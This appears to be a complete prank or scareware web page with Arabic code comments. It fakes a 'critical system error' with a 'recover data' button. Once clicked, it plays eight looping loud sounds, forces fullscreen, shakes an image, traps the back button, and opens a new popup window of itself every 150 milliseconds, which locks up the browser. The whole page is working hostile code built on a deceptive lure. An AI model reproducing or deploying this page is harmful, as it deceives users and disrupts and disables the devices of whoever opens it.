<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚠️ WARNING ⚠️</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; display: flex; justify-content: center; align-items: center; }
        
        /* الصورة كبيرة، واضحة، وتتحرك بجنون سواسوة */
        #madwoman { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            object-fit: cover; z-index: 1; display: none;
            will-change: transform;
        }

        /* رسالة تحذيرية كلاسيكية (بلا ميزة التحديث) سواسوة */
        #ui { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.9); z-index: 1000; display: flex; 
            flex-direction: column; justify-content: center; align-items: center;
            font-family: 'Courier New', monospace; color: #f00; text-align: center;
        }
        .header { font-size: 30px; margin-bottom: 20px; font-weight: bold; text-shadow: 0 0 10px #f00; }
        .blink { animation: b 0.1s infinite; }
        @keyframes b { 50% { opacity: 0; } }
        .btn-start { 
            background: #f00; color: #000; border: none; padding: 20px 50px; 
            font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 30px;
        }
    </style>
</head>
<body onclick="launchTotalMadness()">

    <div id="ui">
        <h1 class="blink">☠️ CRITICAL SYSTEM ERROR ☠️</h1>
        <p>Memory Corruption in Sector 0x00451<br>Click to attempt data recovery.</p>
        <button class="btn-start">RECOVER DATA</button>
    </div>

    <img id="madwoman" src="https://i.ibb.co/39snnynW/1000016067.jpg">

    <div id="allSounds">
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/nikomok.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/twahwih.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/sukuna-gugu-gaga-loudest.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/emotional-damage-99808.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/khrj-khrj.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/m-e-o-w.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/ringtone-nokia-destiny.mp3"></audio>
        <audio class="h" loop><source src="https://www.myinstants.com/media/sounds/aaaaaaaaaaaaaaaaaaaa-e-lutador.mp3"></audio>
    </div>

    <script>
        let aCtx, analyser, data;
        const img = document.getElementById('madwoman');

        function launchTotalMadness() {
            // 1. تشغيل كامل الأصوات سواسوة
            document.querySelectorAll('.h').forEach(a => { a.volume = 1.0; a.play(); });

            document.getElementById('ui').style.display = 'none';
            img.style.display = 'block';
            document.documentElement.requestFullscreen();

            // 2. نظام الحبس واللاق سواسوة
            setInterval(() => {
                history.pushState(null, null, window.location.href);
                window.open(window.location.href, '_blank', 'width=10,height=10');
            }, 150);

            setupMadnessSync();
        }

        window.onpopstate = () => history.go(1);

        function setupMadnessSync() {
            aCtx = new (window.AudioContext || window.webkitAudioContext)();
            // نربط المحلل بصوت "قوقو قاقا" لأنه فيه ضجيج عالي سواسوة
            const source = aCtx.createMediaElementSource(document.querySelectorAll('.h')[2]);
            analyser = aCtx.createAnalyser();
            analyser.fftSize = 256;
            data = new Uint8Array(analyser.frequencyBinCount);
            source.connect(analyser);
            analyser.connect(aCtx.destination);
            
            if (aCtx.state === 'suspended') aCtx.resume();
            
            runMadAnimation();
        }

        function runMadAnimation() {
            analyser.getByteFrequencyData(data);
            let volume = 0;
            for(let i=0; i<data.length; i++) volume += data[i];
            volume = volume / data.length;

            // 3. الرعشة الهستيرية (تتحرك مع الأصوات كاملة) سواسوة
            const intensity = (volume / 255) * 80; 
            const tx = (Math.random() - 0.5) * intensity * 2;
            const ty = (Math.random() - 0.5) * intensity * 2;
            const rot = (Math.random() - 0.5) * intensity;
            const sc = 1 + (volume / 255) * 0.4;

            img.style.transform = `translate(${tx}px, ${ty}px) rotate(${rot}deg) scale(${sc})`;
            
            requestAnimationFrame(runMadAnimation);
        }
    </script>
</body>
</html>
